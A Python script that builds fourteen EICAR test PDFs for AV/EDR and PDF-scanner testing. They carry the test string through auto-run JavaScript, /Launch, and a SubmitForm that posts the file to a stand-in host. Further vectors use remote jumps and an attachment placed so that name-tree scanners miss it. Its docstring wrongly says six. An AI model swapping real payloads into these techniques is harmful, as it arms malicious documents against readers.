#!/usr/bin/env python3
"""
eicar_pdf_generator.py
======================
Builds six proof-of-concept PDFs that each deliver the EICAR standard
anti-virus test string through a different PDF feature that is commonly
abused by malicious documents:

    01_openaction.pdf      /OpenAction + page /AA auto-run a script that
                           drops the embedded EICAR file when the doc opens
    02_launch.pdf          /Launch action targeting the embedded EICAR file
    03_javascript.pdf      /JavaScript (/JS) action reads and drops EICAR
    04_names.pdf           /Names name tree advertising the embedded EICAR
                           file (plus a doc-level /JavaScript name tree)
    05_embeddedfile.pdf    plain /EmbeddedFile payload (Filespec /EF + /AF)
    06_uri_submitform.pdf  /URI open action and a /SubmitForm button that
                           POSTs the whole PDF (embedded EICAR included)
    07_richmedia.pdf       /RichMedia annotation with a Flash (SWF) asset
    08_rendition.pdf       /Rendition, /Sound and /Movie media actions
    09_gotor_gotoe.pdf     /GoToR remote jump + /GoToE embedded-doc jump
    10_importdata.pdf      /ImportData action pulling form data from a file
    11_xfa.pdf             XFA form: XML packet with a docReady script and
                           the raw EICAR string inside the field value
    12_fileattachment.pdf  /FileAttachment annotation (payload reachable
                           without any /Names EmbeddedFiles entry)
    13_collection.pdf      /Collection portfolio bundling several files
    14_next_chain.pdf      /Next action chaining: JS -> URI -> /Launch

The EICAR string is completely harmless -- it exists purely so that AV/EDR
products, sandboxes and PDF-analysis pipelines have something to detect.
These files are meant for DEFENSIVE testing only, in an isolated lab or a
folder excluded from your real-time scanner (they *should* be flagged --
that is the entire point).

Usage:
    python3 eicar_pdf_generator.py     ->  ./eicar_pdfs/*.pdf

No third-party dependencies; PDFs are written as raw objects with a valid
xref table so they open in real readers and parsers.
"""

import hashlib
from pathlib import Path

# The 68-byte EICAR test string. Benign by design; every AV flags it.
EICAR = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
assert len(EICAR) == 68

EICAR_NAME = "eicar.com"
OUT_DIR = Path(__file__).resolve().parent / "eicar_pdfs"


# --------------------------------------------------------------------------
# Minimal raw-PDF writer
# --------------------------------------------------------------------------

def pdf_str(s: str) -> bytes:
    """Encode text as a PDF literal string, escaping backslash and parens."""
    raw = s.encode("latin-1")
    raw = raw.replace(b"\\", b"\\\\").replace(b"(", b"\\(").replace(b")", b"\\)")
    return b"(" + raw + b")"


def _ref(n: int) -> bytes:
    return str(n).encode() + b" 0 R"


class PDFBuilder:
    """Collects indirect objects, then emits header, xref and trailer."""

    def __init__(self) -> None:
        self.objects: list[bytes] = []

    def add(self, body: bytes) -> int:
        self.objects.append(body)
        return len(self.objects)            # 1-based object number

    def reserve(self) -> int:
        self.objects.append(b"")
        return len(self.objects)

    def set(self, num: int, body: bytes) -> None:
        self.objects[num - 1] = body

    def stream(self, data: bytes, extra_dict: bytes = b"") -> int:
        d = b"<< /Length " + str(len(data)).encode()
        if extra_dict:
            d += b" " + extra_dict
        d += b" >>\nstream\n" + data + b"\nendstream"
        return self.add(d)

    def build(self, root: int, path: Path, info: int | None = None) -> None:
        assert all(self.objects), "reserved object was never filled"
        out = bytearray(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")
        offsets = []
        for i, body in enumerate(self.objects, start=1):
            offsets.append(len(out))
            out += str(i).encode() + b" 0 obj\n" + body + b"\nendobj\n"
        xref = len(out)
        n = len(self.objects) + 1
        out += b"xref\n0 " + str(n).encode() + b"\n"
        out += b"0000000000 65535 f \n"
        for off in offsets:
            out += ("%010d 00000 n \n" % off).encode()
        trailer = (b"trailer\n<< /Size " + str(n).encode()
                   + b" /Root " + _ref(root))
        if info:
            trailer += b" /Info " + _ref(info)
        trailer += b" >>\nstartxref\n" + str(xref).encode() + b"\n%%EOF\n"
        out += trailer
        path.write_bytes(bytes(out))


# --------------------------------------------------------------------------
# Shared building blocks
# --------------------------------------------------------------------------

def _scaffold(b: PDFBuilder, label: str, with_embed: bool = True):
    """Objects every sample needs: a font, a visible page label, and the
    EICAR payload as an uncompressed EmbeddedFile stream plus its Filespec.
    The payload sits raw in a stream (no escaping, no compression) so any
    scanner that extracts attachments sees the exact 68-byte signature.
    Set with_embed=False when the sample carries EICAR elsewhere (e.g. XFA)."""
    font = b.add(b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>")
    contents = b.stream(
        b"BT /F1 14 Tf 50 750 Td " + pdf_str(label) + b" Tj ET\n"
    )
    if not with_embed:
        return font, contents, None, None
    checksum = hashlib.md5(EICAR).hexdigest().upper().encode()
    efs = b.stream(
        EICAR,
        b"/Type /EmbeddedFile /Params << /Size " + str(len(EICAR)).encode()
        + b" /CheckSum <" + checksum + b"> >>",
    )
    filespec = b.add(
        b"<< /Type /Filespec /F " + pdf_str(EICAR_NAME)
        + b" /UF " + pdf_str(EICAR_NAME)
        + b" /Desc (EICAR standard anti-virus test file)"
        + b" /EF << /F " + _ref(efs) + b" >> >>"
    )
    return font, contents, efs, filespec


def _names_dict(filespec: int) -> bytes:
    return (b"/Names << /EmbeddedFiles << /Names ["
            + pdf_str(EICAR_NAME) + b" " + _ref(filespec) + b"] >> >>")


def _page(b: PDFBuilder, pages_num: int, font: int, contents: int,
          extra: bytes = b"") -> int:
    return b.add(
        b"<< /Type /Page /Parent " + _ref(pages_num)
        + b" /MediaBox [0 0 612 792]"
        + b" /Resources << /Font << /F1 " + _ref(font) + b" >> >>"
        + b" /Contents " + _ref(contents)
        + (b" " + extra if extra else b"")
        + b" >>"
    )


def _info(b: PDFBuilder, title: str) -> int:
    return b.add(b"<< /Title " + pdf_str(title)
                 + b" /Producer (eicar_pdf_generator) >>")


# --------------------------------------------------------------------------
# Vector 1: /OpenAction (+ page-level /AA)
# --------------------------------------------------------------------------

def pdf_01_openaction(outdir: Path) -> Path:
    b = PDFBuilder()
    font, contents, _, fs = _scaffold(b, "01: /OpenAction + /AA -> embedded EICAR")
    # Runs automatically when the document is opened:
    js_open = b.add(b"<< /S /JavaScript /JS " + pdf_str(
        'this.exportDataObject({cName:"eicar.com", nLaunch:2});') + b" >>")
    # Additional-action dictionary: fires when the page is opened (/O):
    js_aa = b.add(b"<< /S /JavaScript /JS " + pdf_str(
        'app.alert("AA trigger: page opened");'
        'this.exportDataObject({cName:"eicar.com", nLaunch:2});') + b" >>")
    pages = b.reserve()
    page = _page(b, pages, font, contents,
                 b"/AA << /O " + _ref(js_aa) + b" >>")
    b.set(pages, b"<< /Type /Pages /Kids [" + _ref(page) + b"] /Count 1 >>")
    catalog = b.add(
        b"<< /Type /Catalog /Pages " + _ref(pages)
        + b" /OpenAction " + _ref(js_open) + b" " + _names_dict(fs) + b" >>"
    )
    info = _info(b, "EICAR test 01 - OpenAction/AA")
    path = outdir / "01_openaction.pdf"
    b.build(catalog, path, info)
    return path


# --------------------------------------------------------------------------
# Vector 2: /Launch
# --------------------------------------------------------------------------

def pdf_02_launch(outdir: Path) -> Path:
    b = PDFBuilder()
    font, contents, _, fs = _scaffold(b, "02: /Launch -> embedded EICAR")
    # Launch action pointing at the embedded eicar.com file spec, with a
    # Windows-specific launch parameter dictionary for realism:
    launch = b.add(
        b"<< /S /Launch /F " + _ref(fs)
        + b" /Win << /F " + pdf_str("C:\\eicar.com")
        + b" /O (open) /P () /D " + pdf_str("C:\\") + b" >>"
        + b" /NewWindow true >>"
    )
    pages = b.reserve()
    page = _page(b, pages, font, contents)
    b.set(pages, b"<< /Type /Pages /Kids [" + _ref(page) + b"] /Count 1 >>")
    catalog = b.add(
        b"<< /Type /Catalog /Pages " + _ref(pages)
        + b" /OpenAction " + _ref(launch) + b" " + _names_dict(fs) + b" >>"
    )
    info = _info(b, "EICAR test 02 - Launch")
    path = outdir / "02_launch.pdf"
    b.build(catalog, path, info)
    return path


# --------------------------------------------------------------------------
# Vector 3: /JavaScript (/JS)
# --------------------------------------------------------------------------

def pdf_03_javascript(outdir: Path) -> Path:
    b = PDFBuilder()
    font, contents, _, fs = _scaffold(b, "03: /JavaScript (/JS) -> embedded EICAR")
    # JS that reads the embedded payload and drops it to disk:
    js = b.add(b"<< /S /JavaScript /JS " + pdf_str(
        'try{'
        'var s=this.getDataObjectContents("eicar.com");'
        'var d=util.stringFromStream(s);'
        'app.alert("EICAR payload ("+d.length+" bytes): "+d);'
        'this.exportDataObject({cName:"eicar.com", nLaunch:2});'
        '}catch(e){app.alert("drop failed: "+e);}'
    ) + b" >>")
    pages = b.reserve()
    page = _page(b, pages, font, contents)
    b.set(pages, b"<< /Type /Pages /Kids [" + _ref(page) + b"] /Count 1 >>")
    catalog = b.add(
        b"<< /Type /Catalog /Pages " + _ref(pages)
        + b" /OpenAction " + _ref(js) + b" " + _names_dict(fs) + b" >>"
    )
    info = _info(b, "EICAR test 03 - JavaScript")
    path = outdir / "03_javascript.pdf"
    b.build(catalog, path, info)
    return path


# --------------------------------------------------------------------------
# Vector 4: /Names (EmbeddedFiles + doc-level JavaScript name trees)
# --------------------------------------------------------------------------

def pdf_04_names(outdir: Path) -> Path:
    b = PDFBuilder()
    font, contents, _, fs = _scaffold(b, "04: /Names tree -> embedded EICAR")
    js_doc = b.add(b"<< /S /JavaScript /JS " + pdf_str(
        'app.alert("doc-level script referenced from /Names");') + b" >>")
    pages = b.reserve()
    page = _page(b, pages, font, contents)
    b.set(pages, b"<< /Type /Pages /Kids [" + _ref(page) + b"] /Count 1 >>")
    catalog = b.add(
        b"<< /Type /Catalog /Pages " + _ref(pages)
        + b" /Names <<"
        + b" /EmbeddedFiles << /Names ["
        + pdf_str("eicar.com") + b" " + _ref(fs) + b" "
        + pdf_str("eicar.txt") + b" " + _ref(fs) + b"] >>"
        + b" /JavaScript << /Names ["
        + pdf_str("init.js") + b" " + _ref(js_doc) + b"] >>"
        + b" >> >>"
    )
    info = _info(b, "EICAR test 04 - Names")
    path = outdir / "04_names.pdf"
    b.build(catalog, path, info)
    return path


# --------------------------------------------------------------------------
# Vector 5: /EmbeddedFile (Filespec /EF, advertised via /AF)
# --------------------------------------------------------------------------

def pdf_05_embeddedfile(outdir: Path) -> Path:
    b = PDFBuilder()
    font, contents, _, fs = _scaffold(b, "05: /EmbeddedFile payload (Filespec /EF)")
    pages = b.reserve()
    page = _page(b, pages, font, contents)
    b.set(pages, b"<< /Type /Pages /Kids [" + _ref(page) + b"] /Count 1 >>")
    catalog = b.add(
        b"<< /Type /Catalog /Pages " + _ref(pages)
        + b" " + _names_dict(fs)
        + b" /AF [" + _ref(fs) + b"] >>"   # associated-files entry
    )
    info = _info(b, "EICAR test 05 - EmbeddedFile")
    path = outdir / "05_embeddedfile.pdf"
    b.build(catalog, path, info)
    return path


# --------------------------------------------------------------------------
# Vector 6: /URI + /SubmitForm
# --------------------------------------------------------------------------

def pdf_06_uri_submitform(outdir: Path) -> Path:
    b = PDFBuilder()
    font, contents, _, fs = _scaffold(b, "06: /URI + /SubmitForm exfiltrates EICAR")
    # Auto-fired URI action pointing at the "dropped" payload's home:
    uri = b.add(b"<< /S /URI /URI "
                + pdf_str("http://malicious.example/dropper/eicar.com") + b" >>")
    # Hidden text field whose value is the EICAR string (hex-encoded, so a
    # parser that decodes form values recovers the exact 68-byte payload):
    hex_eicar = b"<" + EICAR.hex().upper().encode() + b">"
    payload_field = b.add(
        b"<< /Type /Annot /Subtype /Widget /FT /Tx /T (payload) /F 2"
        + b" /Rect [0 0 0 0] /V " + hex_eicar + b" >>"
    )
    # SubmitForm action: Flags 512 = SubmitPDF -> POSTs the entire PDF,
    # embedded EICAR attachment included, to the collection URL:
    submit = b.add(
        b"<< /S /SubmitForm /F << /FS /URI /F "
        + pdf_str("http://malicious.example/collect") + b" >>"
        + b" /Fields [" + _ref(payload_field) + b"] /Flags 512 >>"
    )
    button = b.add(
        b"<< /Type /Annot /Subtype /Widget /FT /Btn /T (submit)"
        + b" /Rect [50 680 180 712] /F 4"
        + b" /MK << /CA (Submit) >> /BS << /W 1 /S /S >>"
        + b" /A " + _ref(submit) + b" >>"
    )
    pages = b.reserve()
    page = _page(b, pages, font, contents,
                 b"/Annots [" + _ref(payload_field) + b" " + _ref(button) + b"]")
    b.set(pages, b"<< /Type /Pages /Kids [" + _ref(page) + b"] /Count 1 >>")
    catalog = b.add(
        b"<< /Type /Catalog /Pages " + _ref(pages)
        + b" /OpenAction " + _ref(uri)
        + b" /AcroForm << /Fields [" + _ref(payload_field) + b" "
        + _ref(button) + b"] /NeedAppearances true"
        + b" /DR << /Font << /F1 " + _ref(font) + b" >> >> >>"
        + b" " + _names_dict(fs) + b" >>"
    )
    info = _info(b, "EICAR test 06 - URI/SubmitForm")
    path = outdir / "06_uri_submitform.pdf"
    b.build(catalog, path, info)
    return path


# --------------------------------------------------------------------------
# Vector 7: /RichMedia + embedded Flash (SWF asset)
# --------------------------------------------------------------------------

def pdf_07_richmedia(outdir: Path) -> Path:
    b = PDFBuilder()
    font, contents, _, fs = _scaffold(b, "07: RichMedia annotation with Flash asset")
    # The embedded eicar.com doubles as the Flash asset of a RichMedia
    # annotation that auto-activates as soon as the page is shown (/PO):
    instance = b.add(
        b"<< /Type /RichMediaInstance /Subtype /Flash /Asset " + _ref(fs) + b" >>"
    )
    config = b.add(
        b"<< /Type /RichMediaConfiguration /Subtype /Flash /Name (flash_cfg)"
        + b" /Instances [" + _ref(instance) + b"] >>"
    )
    assets = b.add(b"<< /Names [" + pdf_str("eicar.swf") + b" " + _ref(fs) + b"] >>")
    rm_content = b.add(
        b"<< /Type /RichMediaContent /Assets " + _ref(assets)
        + b" /Configurations [" + _ref(config) + b"] >>"
    )
    rm_settings = b.add(
        b"<< /Type /RichMediaSettings"
        + b" /Activation << /Type /RichMediaActivation /Condition /PO >>"
        + b" /Deactivation << /Type /RichMediaDeactivation /Condition /PC >> >>"
    )
    annot = b.add(
        b"<< /Type /Annot /Subtype /RichMedia /Rect [50 550 400 700] /F 4"
        + b" /RichMediaContent " + _ref(rm_content)
        + b" /RichMediaSettings " + _ref(rm_settings) + b" >>"
    )
    pages = b.reserve()
    page = _page(b, pages, font, contents, b"/Annots [" + _ref(annot) + b"]")
    b.set(pages, b"<< /Type /Pages /Kids [" + _ref(page) + b"] /Count 1 >>")
    catalog = b.add(
        b"<< /Type /Catalog /Pages " + _ref(pages) + b" " + _names_dict(fs) + b" >>"
    )
    info = _info(b, "EICAR test 07 - RichMedia/Flash")
    path = outdir / "07_richmedia.pdf"
    b.build(catalog, path, info)
    return path


# --------------------------------------------------------------------------
# Vector 8: /Rendition + /Sound + /Movie actions
# --------------------------------------------------------------------------

def pdf_08_rendition(outdir: Path) -> Path:
    b = PDFBuilder()
    font, contents, _, fs = _scaffold(b, "08: Rendition + Sound + Movie media actions")
    # Media clip whose "media data" is the embedded EICAR file:
    rendition = b.add(
        b"<< /Type /Rendition /S /MR /N (eicar rendition)"
        + b" /C << /Type /MediaClip /S /MCD /CT (application/octet-stream)"
        + b" /P << /TF (TEMPACCESS) >> /D " + _ref(fs) + b" >> >>"
    )
    screen = b.add(b"<< /Type /Annot /Subtype /Screen /Rect [50 500 300 620] /F 4 >>")
    # Played automatically on document open (/OP 0 = play):
    rend_action = b.add(
        b"<< /S /Rendition /OP 0 /R " + _ref(rendition)
        + b" /AN " + _ref(screen) + b" >>"
    )
    # Sound action fired when the page is opened:
    sound = b.add(b"<< /Type /Sound /R 44100 /B 16 /C 1 /F " + _ref(fs) + b" >>")
    sound_action = b.add(b"<< /S /Sound /Sound " + _ref(sound) + b" /Volume 1 >>")
    # Movie annotation set to auto-play (/A true), again backed by EICAR:
    movie = b.add(
        b"<< /Type /Annot /Subtype /Movie /Rect [50 640 300 720] /F 4"
        + b" /T (eicar movie) /A true"
        + b" /Movie << /F " + _ref(fs) + b" /Poster false >> >>"
    )
    pages = b.reserve()
    page = _page(
        b, pages, font, contents,
        b"/Annots [" + _ref(screen) + b" " + _ref(movie) + b"]"
        + b" /AA << /O " + _ref(sound_action) + b" >>",
    )
    b.set(pages, b"<< /Type /Pages /Kids [" + _ref(page) + b"] /Count 1 >>")
    catalog = b.add(
        b"<< /Type /Catalog /Pages " + _ref(pages)
        + b" /OpenAction " + _ref(rend_action) + b" " + _names_dict(fs) + b" >>"
    )
    info = _info(b, "EICAR test 08 - Rendition/Sound/Movie")
    path = outdir / "08_rendition.pdf"
    b.build(catalog, path, info)
    return path


# --------------------------------------------------------------------------
# Vector 9: /GoToR (remote) + /GoToE (embedded document)
# --------------------------------------------------------------------------

def pdf_09_gotor_gotoe(outdir: Path) -> Path:
    b = PDFBuilder()
    font, contents, _, fs = _scaffold(b, "09: GoToR remote jump + GoToE embedded jump")
    # Jump to a remote document the moment the file is opened:
    gotor = b.add(
        b"<< /S /GoToR /F " + pdf_str("http://malicious.example/eicar.pdf")
        + b" /D [0 /Fit] /NewWindow true >>"
    )
    # Jump into the embedded "document" (the EICAR file) on page open:
    gotoe = b.add(
        b"<< /S /GoToE /F " + _ref(fs) + b" /D [0 /Fit] /NewWindow true >>"
    )
    pages = b.reserve()
    page = _page(b, pages, font, contents, b"/AA << /O " + _ref(gotoe) + b" >>")
    b.set(pages, b"<< /Type /Pages /Kids [" + _ref(page) + b"] /Count 1 >>")
    catalog = b.add(
        b"<< /Type /Catalog /Pages " + _ref(pages)
        + b" /OpenAction " + _ref(gotor) + b" " + _names_dict(fs) + b" >>"
    )
    info = _info(b, "EICAR test 09 - GoToR/GoToE")
    path = outdir / "09_gotor_gotoe.pdf"
    b.build(catalog, path, info)
    return path


# --------------------------------------------------------------------------
# Vector 10: /ImportData (form values pulled from a file/URL)
# --------------------------------------------------------------------------

def pdf_10_importdata(outdir: Path) -> Path:
    b = PDFBuilder()
    font, contents, _, fs = _scaffold(b, "10: ImportData pulls form values from a file")
    field = b.add(
        b"<< /Type /Annot /Subtype /Widget /FT /Tx /T (imported)"
        + b" /Rect [50 700 300 725] /F 4 >>"
    )
    # /F of an ImportData action is a file spec -- here the embedded "FDF"
    # the form imports happens to be the EICAR payload itself:
    import_action = b.add(b"<< /S /ImportData /F " + _ref(fs) + b" >>")
    pages = b.reserve()
    page = _page(b, pages, font, contents, b"/Annots [" + _ref(field) + b"]")
    b.set(pages, b"<< /Type /Pages /Kids [" + _ref(page) + b"] /Count 1 >>")
    catalog = b.add(
        b"<< /Type /Catalog /Pages " + _ref(pages)
        + b" /OpenAction " + _ref(import_action)
        + b" /AcroForm << /Fields [" + _ref(field) + b"] /NeedAppearances true >>"
        + b" " + _names_dict(fs) + b" >>"
    )
    info = _info(b, "EICAR test 10 - ImportData")
    path = outdir / "10_importdata.pdf"
    b.build(catalog, path, info)
    return path


# --------------------------------------------------------------------------
# Vector 11: XFA form (separate XML engine, docReady script)
# --------------------------------------------------------------------------

def pdf_11_xfa(outdir: Path) -> Path:
    b = PDFBuilder()
    font, contents, _, _ = _scaffold(
        b, "11: XFA form - XML packet with docReady script", with_embed=False
    )
    # XFA drives a completely separate XML engine with its own scripting.
    # The raw EICAR string sits inside the field's <text> value, so the
    # bytes appear verbatim in the uncompressed XFA stream:
    xfa_xml = (
        b'<?xml version="1.0" encoding="UTF-8"?>\n'
        b'<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">\n'
        b'<template xmlns="http://www.xfa.org/schema/xfa-template/3.0/">\n'
        b'<subform name="form1">\n'
        b'<field name="payload">\n'
        b'<value><text>' + EICAR + b'</text></value>\n'
        b'<event activity="docReady">\n'
        b'<script contentType="application/x-javascript">'
        b'app.alert("XFA docReady: payload staged");'
        b'</script>\n'
        b'</event>\n'
        b'</field>\n'
        b'</subform>\n'
        b'</template>\n'
        b'</xdp:xdp>\n'
    )
    xfa = b.stream(xfa_xml)
    pages = b.reserve()
    page = _page(b, pages, font, contents)
    b.set(pages, b"<< /Type /Pages /Kids [" + _ref(page) + b"] /Count 1 >>")
    catalog = b.add(
        b"<< /Type /Catalog /Pages " + _ref(pages)
        + b" /AcroForm << /Fields [] /XFA " + _ref(xfa) + b" >> >>"
    )
    info = _info(b, "EICAR test 11 - XFA")
    path = outdir / "11_xfa.pdf"
    b.build(catalog, path, info)
    return path


# --------------------------------------------------------------------------
# Vector 12: /FileAttachment annotation (outside the /Names tree)
# --------------------------------------------------------------------------

def pdf_12_fileattachment(outdir: Path) -> Path:
    b = PDFBuilder()
    font, contents, _, fs = _scaffold(
        b, "12: FileAttachment annotation (no name tree)"
    )
    # The payload is reachable ONLY through this annotation's /FS entry --
    # the catalog deliberately has no /Names EmbeddedFiles tree, so scanners
    # that only walk the name tree will miss the attachment:
    annot = b.add(
        b"<< /Type /Annot /Subtype /FileAttachment /Rect [50 700 80 730] /F 4"
        + b" /Name /PushPin /Contents (double-click to open)"
        + b" /FS " + _ref(fs) + b" >>"
    )
    pages = b.reserve()
    page = _page(b, pages, font, contents, b"/Annots [" + _ref(annot) + b"]")
    b.set(pages, b"<< /Type /Pages /Kids [" + _ref(page) + b"] /Count 1 >>")
    catalog = b.add(b"<< /Type /Catalog /Pages " + _ref(pages) + b" >>")
    info = _info(b, "EICAR test 12 - FileAttachment")
    path = outdir / "12_fileattachment.pdf"
    b.build(catalog, path, info)
    return path


# --------------------------------------------------------------------------
# Vector 13: /Collection portfolio (bundle of files)
# --------------------------------------------------------------------------

def pdf_13_collection(outdir: Path) -> Path:
    b = PDFBuilder()
    font, contents, _, fs = _scaffold(b, "13: Collection portfolio bundling files")
    # A decoy member file next to eicar.com inside the portfolio:
    decoy = b"Portfolios bundle several documents into one PDF container.\n"
    decoy_stream = b.stream(
        decoy,
        b"/Type /EmbeddedFile /Params << /Size " + str(len(decoy)).encode() + b" >>",
    )
    decoy_fs = b.add(
        b"<< /Type /Filespec /F (readme.txt) /UF (readme.txt)"
        + b" /EF << /F " + _ref(decoy_stream) + b" >> >>"
    )
    pages = b.reserve()
    page = _page(b, pages, font, contents)
    b.set(pages, b"<< /Type /Pages /Kids [" + _ref(page) + b"] /Count 1 >>")
    catalog = b.add(
        b"<< /Type /Catalog /Pages " + _ref(pages)
        + b" /Collection << /Type /Collection /D " + pdf_str(EICAR_NAME)
        + b" /View /T >>"
        + b" /Names << /EmbeddedFiles << /Names ["
        + pdf_str(EICAR_NAME) + b" " + _ref(fs) + b" "
        + pdf_str("readme.txt") + b" " + _ref(decoy_fs) + b"] >> >>"
        + b" >>"
    )
    info = _info(b, "EICAR test 13 - Collection")
    path = outdir / "13_collection.pdf"
    b.build(catalog, path, info)
    return path


# --------------------------------------------------------------------------
# Vector 14: /Next action chaining (JS -> URI -> Launch)
# --------------------------------------------------------------------------

def pdf_14_next_chain(outdir: Path) -> Path:
    b = PDFBuilder()
    font, contents, _, fs = _scaffold(b, "14: Next action chain (JS -> URI -> Launch)")
    # Actions execute in sequence when the document opens: an alert, then
    # a URI fetch, then the launch of the embedded EICAR file:
    launch = b.add(b"<< /S /Launch /F " + _ref(fs) + b" /NewWindow true >>")
    uri = b.add(
        b"<< /S /URI /URI " + pdf_str("http://malicious.example/stage2")
        + b" /Next " + _ref(launch) + b" >>"
    )
    js = b.add(
        b"<< /S /JavaScript /JS " + pdf_str('app.alert("stage 1 of 3");')
        + b" /Next " + _ref(uri) + b" >>"
    )
    pages = b.reserve()
    page = _page(b, pages, font, contents)
    b.set(pages, b"<< /Type /Pages /Kids [" + _ref(page) + b"] /Count 1 >>")
    catalog = b.add(
        b"<< /Type /Catalog /Pages " + _ref(pages)
        + b" /OpenAction " + _ref(js) + b" " + _names_dict(fs) + b" >>"
    )
    info = _info(b, "EICAR test 14 - Next chain")
    path = outdir / "14_next_chain.pdf"
    b.build(catalog, path, info)
    return path


# --------------------------------------------------------------------------

VECTORS = (
    pdf_01_openaction,
    pdf_02_launch,
    pdf_03_javascript,
    pdf_04_names,
    pdf_05_embeddedfile,
    pdf_06_uri_submitform,
    pdf_07_richmedia,
    pdf_08_rendition,
    pdf_09_gotor_gotoe,
    pdf_10_importdata,
    pdf_11_xfa,
    pdf_12_fileattachment,
    pdf_13_collection,
    pdf_14_next_chain,
)


def main() -> None:
    OUT_DIR.mkdir(exist_ok=True)
    for build in VECTORS:
        path = build(OUT_DIR)
        print(f"[+] wrote {path.name:26s} {path.stat().st_size:5d} bytes")
    print(f"\n{len(VECTORS)} samples written to {OUT_DIR}")
    print("Each carries the exact 68-byte EICAR test string raw inside an")
    print("uncompressed stream -- expect your AV/EDR to flag them.")


if __name__ == "__main__":
    main()
